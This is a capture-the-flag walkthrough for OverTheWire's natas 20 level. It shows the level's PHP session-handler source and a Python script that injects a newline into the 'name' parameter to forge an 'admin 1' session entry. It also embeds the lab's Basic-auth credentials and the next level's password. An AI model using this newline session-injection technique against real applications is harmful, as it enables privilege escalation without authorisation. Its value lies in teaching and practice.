---
title: natas 20 walkthrough
description: over the wire natas 20
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-20 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 20 walkthrough
    order: 30
---
## Description
> Username: natas20
> 
> URL:      http://natas20.natas.labs.overthewire.org
### Source Code
```php
<?php

function debug($msg)
{ 
    if (array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials()
{ 
    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas21\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}


/* we don't need this */
function myopen($path, $name)
{
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose()
{
    //debug("MYCLOSE");
    return true;
}

function myread($sid)
{
    debug("MYREAD $sid");
    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
        debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if (!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from " . $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach (explode("\n", $data) as $line) {
        debug("Read [$line]");
        $parts = explode(" ", $line, 2);
        if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data)
{
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
        debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in " . $filename);
    ksort($_SESSION);
    foreach ($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid)
{
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t)
{
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage"
);
session_start();

if (array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if (array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

```

---
## Progress
### Observation
Since session is stored as serialized version, one may give some illegal input to overwrite the admin attribute.
### Trial
Try `name\nadmin 1`. It does not work. It seems that `\n` cannot be input as a value of form by browser. Need to write a script.
### Pwn
```python
import requests
from bs4 import BeautifulSoup

def request_with_session_id(input_name):
    return request_with_payload(f"name={input_name}")

def request_with_payload(payload):
    header = {
        "Authorization" : "Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==",
    }
    url = "http://natas20.natas.labs.overthewire.org/index.php?" + payload
    response = requests.get(url, headers=header)
    return response.cookies
    
def request_with_cookie(cookies):
    header = {
        "Authorization" : "Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==",
    }
    url = "http://natas20.natas.labs.overthewire.org/index.php?"
    response = requests.get(url, headers=header, cookies=cookies)
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    if "You are an admin" in content.__str__():
        print(content)
    else:
        print("failed")

def main():
    cookies = request_with_session_id("b\nadmin 1")
    request_with_cookie(cookies)

main()
```
89OWrTkGmiLZLv12JY4tLj2c4FW0xn56

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 

### Tools
- 